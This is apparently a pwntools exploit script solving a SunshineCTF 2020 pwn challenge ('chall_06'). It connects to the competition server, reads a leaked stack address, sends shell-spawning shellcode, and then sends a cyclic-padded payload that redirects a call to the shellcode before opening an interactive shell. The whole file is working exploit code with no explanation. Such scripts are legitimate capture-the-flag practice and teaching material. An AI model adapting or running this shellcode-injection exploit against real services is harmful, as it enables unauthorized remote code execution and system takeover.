from pwn import *

context.arch = 'amd64'

sh = remote('chal.2020.sunshinectf.org', 30006)
# sh = process('./chall_06')

s = sh.recvline().decode('ascii').split()
rsp = int(s[-1], 0)
print('rsp:', hex(rsp))

# sh_code = asm(shellcraft.sh()).rjust(64, asm('nop'))
sh_code = asm(shellcraft.sh())
sh.sendline(sh_code)

# ► 0x5555555547a0 <vuln+56>    call   rdx <0x616161706161616f>
padding = cyclic_find(0x6161616f)
print(padding)
payload = cyclic(padding) + p64(rsp)
print(len(payload))

sh.sendline(payload)
sh.interactive()
